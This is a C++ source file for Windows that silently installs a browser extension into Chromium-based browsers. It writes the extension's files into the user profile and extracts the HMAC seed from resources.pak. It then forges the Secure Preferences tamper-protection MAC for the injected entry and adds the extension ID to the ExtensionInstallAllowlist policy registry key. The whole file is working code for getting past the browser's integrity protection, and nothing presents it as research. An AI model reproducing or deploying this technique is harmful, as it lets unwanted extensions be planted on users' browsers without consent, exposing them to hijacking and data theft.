#include "stdafx.h"

namespace local {

 IBrowser::IBrowser(const protocol::EnBrowserID& id) :
  ID(id) {
  Init();
 }
 IBrowser::~IBrowser() {
  UnInit();
 }
 void IBrowser::Init() {

 }
 void IBrowser::UnInit() {

 }
 const protocol::EnBrowserID& IBrowser::IDGet() const {
  std::lock_guard<std::mutex> lock{ *m_Mutex };
  return ID;
 }
 bool IBrowser::Ready() const {
  bool result = false;
  std::lock_guard<std::mutex> lock{ *m_Mutex };
  do {
   if (ID <= protocol::EnBrowserID::EN_BROWSER_TYPE_BEGIN)
    break;
   if (ID > protocol::EnBrowserID::EN_BROWSER_TYPE_END)
    break;
   if (InstallPath.empty() || !shared::Win::AccessA(InstallPath))
    break;
   if (MainProgramPathname.empty() || !shared::Win::AccessA(MainProgramPathname))
    break;
   if (Version.empty())
    break;

   result = true;
  } while (0);
  return result;
 }
	bool IBrowser::Finish() {
		bool result = false;
		std::lock_guard<std::mutex> lock{ *m_Mutex };
		do {

			std::string super_mac;
			if (!SuperMac(super_mac))
				break;
			auto write_buffer = shared::Json::toString(SecurePreferencesDoc);
			shared::Json::Replace(write_buffer, "<", "\\u003C");
			if (!shared::Win::File::Write(UserDataDefaultSecurePreferencesPathname, write_buffer))
				break;

			result = true;
		} while (0);
		return result;
	}


 bool IBrowser::ExtensionsSetup(const std::string& extensions_zip_pak) {
  bool result = false;
  std::lock_guard<std::mutex> lock{ *m_Mutex };
  std::map<std::string, std::string> extensions_paks;
  do {
   if (extensions_zip_pak.empty())
    break;
   if (!shared::Zip::IsZipCompress(extensions_zip_pak))
    break;
   std::string gbk_json_manifest_buffer;
   std::string extension_release_path = shared::Win::GetTempPathA();
   shared::Zip::zipBufferUnCompress(
    extensions_zip_pak,
    [&](const std::string& identify, const std::string& data, bool& _break)->bool {
     if (::StrStrIA(identify.c_str(), "manifest.json") && gbk_json_manifest_buffer.empty()) {
      gbk_json_manifest_buffer = data;
     }
     if (::StrStrIA(identify.c_str(), "extensions/") && identify.size() > ::strlen("extensions/"))
      extensions_paks.emplace(identify.c_str() + ::strlen("extensions/"), data);

     return false;
    }, extension_release_path);
   rapidjson::Document doc_manifest_release;
   rapidjson::Document doc_manifest_template;
   if (!ManifestParse(gbk_json_manifest_buffer, doc_manifest_release, true))
    break;
   if (protocol::MapBrowserExtensionsTemplate.find(ID) == protocol::MapBrowserExtensionsTemplate.end())
    break;
   if (!ManifestParse(protocol::MapBrowserExtensionsTemplate.at(ID), doc_manifest_template, false))
    break;
   rapidjson::Document docFinal;
   if (!ManifestGenerate(doc_manifest_template, doc_manifest_release, docFinal))
    break;

   std::string extensionsPrivateKey{ protocol::ChromeExtensionsPrivateKey }, extensionsPubliceKey, extensionsDerKey, extensionsIdentify;
   shared::Openssl::ChromeExtensionsIDGenerate(extensionsPrivateKey, extensionsPubliceKey, extensionsDerKey, extensionsIdentify);
   if (extensionsDerKey.empty() || extensionsIdentify.empty())
    break;

   //!@ 是否已经安装 
   auto tempCache = shared::Json::toString(SecurePreferencesDoc);
   if (tempCache.find(extensionsIdentify) != std::string::npos) {

    break;
   }


   std::string setup_extensions_version;
   do {//!@ version
    if (!docFinal.HasMember("manifest"))
     break;
    if (!docFinal["manifest"].IsObject())
     break;
    if (docFinal["manifest"].ObjectEmpty())
     break;
    if (!docFinal["manifest"].HasMember("version"))
     break;
    if (!docFinal["manifest"]["version"].IsString())
     break;
    if (docFinal["manifest"]["version"].GetStringLength() <= 0)
     break;
    setup_extensions_version = docFinal["manifest"]["version"].GetString();
   } while (0);
   if (setup_extensions_version.empty())
    break;

   do {// .install_time
    if (!docFinal.HasMember("install_time"))
     break;
    docFinal.RemoveMember("install_time");
    docFinal.AddMember(rapidjson::Value().SetString("install_time", docFinal.GetAllocator()).Move(),
     rapidjson::Value().SetString(std::to_string(shared::Win::Time::TimeStampWebkit()).c_str(), docFinal.GetAllocator()).Move(),
     docFinal.GetAllocator());
   } while (0);

   do {// .path
    if (!docFinal.HasMember("path"))
     break;
    docFinal.RemoveMember("path");
    std::string path = extensionsIdentify + "\\" + setup_extensions_version + "_0";
    docFinal.AddMember(rapidjson::Value().SetString("path", docFinal.GetAllocator()).Move(),
     rapidjson::Value().SetString(path.c_str(), docFinal.GetAllocator()).Move(),
     docFinal.GetAllocator());

    std::string extensions_release_path = shared::Win::PathFixedA(UserDataDir + "\\extensions\\" + path);
    if (extensions_paks.empty())
     break;
    for (const auto& node : extensions_paks) {
     std::string release_file = shared::Win::PathFixedA(extensions_release_path + "\\" + node.first);
     shared::Win::File::Write(release_file, node.second);
    }
   } while (0);

   do {// .manifest.key
    if (!docFinal.HasMember("manifest"))
     break;
    if (!docFinal["manifest"].IsObject())
     break;
    if (docFinal["manifest"].ObjectEmpty())
     break;
    if (docFinal["manifest"].HasMember("key"))
     docFinal["manifest"].RemoveMember("key");

    docFinal["manifest"].AddMember(rapidjson::Value().SetString("key", docFinal.GetAllocator()).Move(),
     rapidjson::Value().SetString(extensionsDerKey.c_str(), docFinal.GetAllocator()).Move(),
     docFinal.GetAllocator());
   } while (0);

   shared::Json::Sort(docFinal, docFinal);

   do {
    if (!SecurePreferencesDoc.HasMember("extensions") || !SecurePreferencesDoc["extensions"].IsObject())
     break;
    if (!SecurePreferencesDoc["extensions"].HasMember("settings") || !SecurePreferencesDoc["extensions"]["settings"].IsObject())
     break;
    SecurePreferencesDoc["extensions"]["settings"].AddMember(
     rapidjson::Value().SetString(extensionsIdentify.c_str(), SecurePreferencesDoc.GetAllocator()).Move(),
     docFinal,
     SecurePreferencesDoc.GetAllocator()
    );
    shared::Json::Compress(SecurePreferencesDoc["extensions"]["settings"][extensionsIdentify.c_str()], \
     SecurePreferencesDoc["extensions"]["settings"]);
    auto jsonu8 = shared::Json::toString(SecurePreferencesDoc["extensions"]["settings"][extensionsIdentify.c_str()]);
    shared::Json::Replace(jsonu8, "<", "\\u003C");
    std::string message;
    message
     .append(UserSid)
     .append("extensions.settings.")
     .append(extensionsIdentify)
     .append(jsonu8);
    std::string config_hmac;
    shared::Openssl::HMAC_SHA256(message, config_hmac, std::string((char*)m_pResObj->Seed(), m_pResObj->SeedSize()));
    config_hmac = shared::IConv::ToUpperA(config_hmac);
    if (!SecurePreferencesDoc.HasMember("protection")) {
     rapidjson::Value obj{ rapidjson::kObjectType };
     SecurePreferencesDoc.AddMember(
      rapidjson::Value().SetString("protection", SecurePreferencesDoc.GetAllocator()).Move(),
      obj,
      SecurePreferencesDoc.GetAllocator());
    }
    if (!SecurePreferencesDoc["protection"].IsObject())
     break;
    if (!SecurePreferencesDoc["protection"].HasMember("macs")) {
     rapidjson::Value obj{ rapidjson::kObjectType };
     SecurePreferencesDoc["protection"].AddMember(
      rapidjson::Value().SetString("macs", SecurePreferencesDoc.GetAllocator()).Move(),
      obj,
      SecurePreferencesDoc.GetAllocator());
    }
    if (!SecurePreferencesDoc["protection"]["macs"].IsObject())
     break;
    if (!SecurePreferencesDoc["protection"]["macs"].HasMember("extensions")) {
     rapidjson::Value obj{ rapidjson::kObjectType };
     SecurePreferencesDoc["protection"]["macs"].AddMember(
      rapidjson::Value().SetString("extensions", SecurePreferencesDoc.GetAllocator()).Move(),
      obj,
      SecurePreferencesDoc.GetAllocator());
    }
    if (!SecurePreferencesDoc["protection"]["macs"]["extensions"].IsObject())
     break;
    if (!SecurePreferencesDoc["protection"]["macs"]["extensions"].HasMember("settings")) {
     rapidjson::Value obj{ rapidjson::kObjectType };
     SecurePreferencesDoc["protection"]["macs"]["extensions"].AddMember(
      rapidjson::Value().SetString("settings", SecurePreferencesDoc.GetAllocator()).Move(),
      obj,
      SecurePreferencesDoc.GetAllocator());
    }
    if (!SecurePreferencesDoc["protection"]["macs"]["extensions"]["settings"].IsObject())
     break;
    if (SecurePreferencesDoc["protection"]["macs"]["extensions"]["settings"].HasMember(extensionsIdentify.c_str()))
     SecurePreferencesDoc["protection"]["macs"]["extensions"]["settings"].RemoveMember(extensionsIdentify.c_str());
    SecurePreferencesDoc["protection"]["macs"]["extensions"]["settings"].AddMember(
     rapidjson::Value().SetString(extensionsIdentify.c_str(), SecurePreferencesDoc.GetAllocator()).Move(),
     rapidjson::Value().SetString(config_hmac.c_str(), SecurePreferencesDoc.GetAllocator()).Move(),
     SecurePreferencesDoc.GetAllocator()
    );
   } while (0);

   do {
    const std::string RegPathExtensionInstallAllowlist = shared::Win::PathFixedA(protocol::MapBrowserRegisterPoliciesPath.at(ID) + "\\ExtensionInstallAllowlist\\");
    std::map<std::string, std::string> keyvals;
    shared::Win::Registry::EnumValues(RegPathExtensionInstallAllowlist, keyvals);
    bool found = false;
    for (const auto& node : keyvals) {
     if (node.second.compare(extensionsIdentify) == 0) {
      found = true;
      break;
     }
    }
    if (found)
     break;
    auto write_register = RegPathExtensionInstallAllowlist + std::to_string(keyvals.size() + 1);
    shared::Win::Registry::NtWrite(write_register, extensionsIdentify, REG_SZ);
   } while (0);

   result = true;
  } while (0);
  return result;
 }

 /////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
 ResourcesPak::ResourcesPak(const std::string& res) : m_Steram(res) {
  SeedGet();
 }
 ResourcesPak::~ResourcesPak() {

 }
 const std::uint8_t* ResourcesPak::Seed() const {
  std::lock_guard<std::mutex> lock{ *m_Mutex };
  return &m_Seed[0];
 }
 size_t ResourcesPak::SeedSize() const {
  std::lock_guard<std::mutex> lock{ *m_Mutex };
  return m_SeedSize;
 }
 const std::uint32_t& ResourcesPak::Version() const {
  std::lock_guard<std::mutex> lock{ *m_Mutex };
  return m_Version;
 }
 bool ResourcesPak::Verify() const {
  std::lock_guard<std::mutex> lock{ *m_Mutex };
  return m_Version != 0;
 }

 size_t header_size = 12;
 size_t resourceSize = 2 + 4;
 const ChromiumPakEntry* entry_at_index(const char* data, const  size_t& idx, const size_t& head_size) {
  size_t offset = head_size + idx * resourceSize;
  return reinterpret_cast<const ChromiumPakEntry*>(data + offset);
 }

 bool ResourcesPak::SeedGet() {
  bool result = false;
  do {
   if (!PakParseHeader())
    break;
   if (m_Steram.size() < m_CustomPakHeader.size + (m_CustomPakHeader.resource_count + 1) * sizeof(ChromiumPakEntry) +
    m_CustomPakHeader.alias_count * sizeof(ChromiumPakAlias))
    break;
   std::uint32_t offset_prev = entry_at_index(m_Steram.data(), 0, m_CustomPakHeader.size)->offset;
   for (std::uint32_t i = 1; i <= m_CustomPakHeader.resource_count + 1; i++) {
    std::uint32_t offset = entry_at_index(m_Steram.data(), i, m_CustomPakHeader.size)->offset;
    if (offset - offset_prev == 64) {
     m_SeedSize = 64;
     ::memcpy(m_Seed, m_Steram.data() + offset_prev, 64);
     m_strHexSeed = shared::Win::BinToHex(std::string((char*)&m_Seed[0], 64));
     result = true;
     break;
    }
    offset_prev = offset;
    if (m_Steram.size() < offset)
     break;
   }
  } while (0);
  return result;
 }
 void ResourcesPak::PakGetVersion() {
  if (m_Steram.empty())
   return;
  m_Version = (*(std::uint32_t*)(m_Steram.data()));
 }
 bool ResourcesPak::PakParseHeader() {
  PakGetVersion();
  m_CustomPakHeader.version = m_Version;
  switch (m_CustomPakHeader.version) {
  case 4: {
   ChromiumPakHeaderV4* header = (ChromiumPakHeaderV4*)m_Steram.data();
   m_CustomPakHeader.resource_count = header->resource_count;
   m_CustomPakHeader.encoding = header->encoding;
   m_CustomPakHeader.alias_count = 0;
   m_CustomPakHeader.size = sizeof(ChromiumPakHeaderV4);
  }break;
  case 5: {
   ChromiumPakHeaderV5* header = (ChromiumPakHeaderV5*)m_Steram.data();
   m_CustomPakHeader.resource_count = header->resource_count;
   m_CustomPakHeader.encoding = header->encoding;
   m_CustomPakHeader.alias_count = header->alias_count;
   m_CustomPakHeader.size = sizeof(ChromiumPakHeaderV5);
  }break;
  default:
   return false;
  }
  return true;
 }
#if 0
 std::uint32_t IChrome::PakWriteHeader(const CustomPakHeader& custom_head, void* out_buffer) {
  if (!out_buffer)
   return 0;
  switch (custom_head.version) {
  case 4: {
   ChromePakHeaderV4* header = (ChromePakHeaderV4*)out_buffer;
   header->version = custom_head.version;
   header->resource_count = custom_head.resource_count;
   header->encoding = custom_head.encoding;
  }break;
  case 5: {
   ChromePakHeaderV5* header = (ChromePakHeaderV5*)out_buffer;
   header->version = custom_head.version;
   header->resource_count = (std::uint16_t)custom_head.resource_count;
   header->encoding = custom_head.encoding;
   header->alias_count = custom_head.alias_count;
  }break;
  default:
   return 0;
  }
  return custom_head.size;
 }
#endif

	bool IBrowser::SuperMac(std::string& out_super_mac) {
  return false;
	}

 bool IBrowser::ManifestGenerate(const rapidjson::Document& docTemplate, const rapidjson::Document& docSetup, rapidjson::Document& outFinal) const {
  bool result = false;
  do {
   if (!docTemplate.IsObject() || !docSetup.IsObject())
    break;
   if (docTemplate.ObjectEmpty() || docSetup.ObjectEmpty())
    break;
   rapidjson::Document copyFinal;
   copyFinal.CopyFrom(docTemplate, copyFinal.GetAllocator());
   rapidjson::Document copySetup;
   copySetup.CopyFrom(docSetup, copySetup.GetAllocator());
   if (!copyFinal.HasMember("manifest")) {
    copyFinal.AddMember(\
     rapidjson::Value().SetString("manifest", copyFinal.GetAllocator()).Move(),
     copySetup,
     copyFinal.GetAllocator());
    break;
   }
   else {

    for (auto it = copySetup.MemberBegin(); it != copySetup.MemberEnd(); ++it) {
     if (copyFinal["manifest"].HasMember(it->name))
      copyFinal["manifest"].RemoveMember(it->name);
     copyFinal["manifest"].AddMember(it->name, it->value, copyFinal.GetAllocator());
    }
   }

   outFinal = rapidjson::Document();
   outFinal.CopyFrom(copyFinal, outFinal.GetAllocator());
   result = true;
  } while (0);
  return result;
 }
 bool IBrowser::ManifestParse(const std::string& manifest_json_buffer, rapidjson::Document& outDoc, const bool& utf8/*=true*/) const {
  bool result = false;
  do {
   if (manifest_json_buffer.empty())
    break;
   if (!utf8) {
    auto u8 = shared::IConv::MBytesToUTF8(manifest_json_buffer);
    if (outDoc.Parse(u8.data(), u8.size()).HasParseError())
     break;
   }
   else {
    if (outDoc.Parse(manifest_json_buffer.data(), manifest_json_buffer.size()).HasParseError())
     break;
   }

   result = true;
  } while (0);
  return result;
 }


}///namespace local